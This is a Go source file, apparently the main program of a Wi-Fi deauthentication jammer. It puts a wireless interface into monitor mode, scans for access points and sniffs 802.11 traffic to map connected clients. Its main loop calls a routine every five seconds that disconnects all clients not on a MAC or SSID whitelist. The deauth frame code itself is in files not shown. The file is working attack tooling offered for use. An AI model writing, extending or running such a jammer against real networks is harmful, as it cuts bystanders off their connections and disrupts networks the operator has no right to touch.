package main

import (
	"fmt"
	"github.com/jessevdk/go-flags"
	"log"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/dauie/go-netlink/nl80211"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

type Opts struct {
	MonitorInterface	string	`short:"i" long:"interface" required:"true" description:"name of interface that will be used for monitoring and injecting frames (e.g wlan0)"`
	ClientWhiteList		string	`short:"c" long:"cwlist" description:"file with new line separated list of MACs to be spared"`
	APWhiteList			string	`short:"a" long:"awlist" description:"file with new line separated list of SSIDs to be spared"`
	EnableGui			bool	`short:"g" long:"gui" description:"enable gui mode for manual control"`
}

var QuitG = false

func	help() {

	fmt.Printf("useage: %s <iface> <whitelist | 'none'>\n", os.Args[0])
	os.Exit(1)
}

func	handleSigInt() {

	sigc := make(chan os.Signal, 1)
	go func () {
		s := <-sigc
		if s == syscall.SIGINT {
			QuitG = true
		}
	}()
	signal.Notify(sigc, syscall.SIGINT)
}

func	checkComms(targAPs *List, targClis *List, wListClis *List, pkt gopacket.Packet) {

	var cli		*Client
	var ap		Ap
	var cliAddr	net.HardwareAddr
	var apAddr	net.HardwareAddr
	var fromClient = false

	if pkt == nil {
		return
	}
	radioTap := pkt.Layer(layers.LayerTypeRadioTap)
	dot11 := pkt.Layer(layers.LayerTypeDot11)
	if dot11 == nil || radioTap == nil {
		return
	}
	tap := radioTap.(*layers.RadioTap)
	dot := dot11.(*layers.Dot11)
	// did the message originate from the client?
	if dot.Address1.String() != dot.Address3.String() {
		cliAddr = dot.Address1
		apAddr = dot.Address2
		fromClient = true
	} else {
		apAddr = dot.Address1
		cliAddr = dot.Address2
	}
	// is the client whitelisted?
	if _, ok := wListClis.Get(cliAddr.String()); ok {
		return
	}
	// is the ap on our target list?
	if a, ok := targAPs.Get(apAddr.String()[:16]); ok {
		ap = (a).(Ap)
	} else {
		return
	}
	// have we seen this client before?
	if v, ok := targClis.Get(cliAddr.String()); ok {
		cli = (v).(*Client)
	} else {
		cli = new(Client)
		cli.hwaddr = cliAddr
	}
	if fromClient {
		cli.dot = *dot
		cli.tap = *tap
	} else {
		ap.dot = *dot
		ap.tap = *tap
	}
	targClis.Add(cli.hwaddr.String(), cli)
	ap.AddClient(cli)
	targAPs.Add(ap.hwaddr.String()[0:16], ap)
}

func	getWhiteLists(opts *Opts) (client List, ap List) {

	apWList, err := getListFromFile(opts.APWhiteList)
	if err != nil {
		log.Fatalln("getListFromFile()", err)
	}
	cliWList, err := getListFromFile(opts.ClientWhiteList)
	if err != nil {
		log.Fatalln("getListFromFile()", err)
	}
	return cliWList, apWList
}

func	initEnv() {
	//set rand seed
	rand.Seed(time.Now().UTC().UnixNano())
	//catch sigint
	handleSigInt()
}

func	main() {

	var opts		Opts
	var wListAPs	List
	var wListCli	List
	var targAPs		List
	var targClis	List

	initEnv()
	if _, err := flags.ParseArgs(&opts, os.Args); err != nil {
		os.Exit(1)
	}
	wListCli, wListAPs = getWhiteLists(&opts)
	monIfa, err := NewJamConn(opts.MonitorInterface)
	if err != nil {
		log.Fatalln("NewJamConn()", err)
	}
	defer func() {
		if err := monIfa.nlconn.Close(); err != nil {
			log.Fatalln("genetlink.Conn.Close()", err)
		}
	}()
	if err := monIfa.DoAPScan(&wListAPs, &targAPs); err != nil {
		log.Fatalln("JamConn.DoAPScan()", err)
	}
	if err := monIfa.SetIfaType(nl80211.IFTYPE_MONITOR); err != nil {
		log.Fatalln("JamConn.SetIfaType()", err.Error())
	}
	defer func() {
		if err := monIfa.SetIfaType(nl80211.IFTYPE_STATION); err != nil {
			log.Fatalln("JamConn.SetIfaType()", err.Error())
		}
	}()
	if err := monIfa.SetupPcapHandle(); err != nil {
		log.Fatalln("setupPcapHandle() ", err)
	}
	defer monIfa.handle.Close()
	if err := monIfa.SetFilterForTargets(); err != nil {
		log.Fatalln("JamConn.SetFilterForTargets()", err)
	}
	packSrc := gopacket.NewPacketSource(monIfa.handle, monIfa.handle.LinkType())
	monIfa.SetLastChanSwitch(time.Now())
	monIfa.SetLastDeauth(time.Now())
	for !QuitG {
		packet, err := packSrc.NextPacket()
		if err != nil {
			if err.Error() == "Read Error" {
				log.Fatalln("gopacket.PacketSource.NextPacket()", err,
					"\ndevice possibly disconnected or removed from monitor mode")
			}
			if err.Error() != "Timeout Expired" {
				log.Fatalln("gopacket.PacketSource.NextPacket()", err.Error())
			}
		}
		checkComms(&targAPs, &targClis, &wListCli, packet)
		monIfa.DeauthClientsIfPast(time.Second * 5,2,  &targAPs)
		monIfa.DoAPScanIfPast(time.Minute * 1, &wListAPs, &targAPs)
	}
}
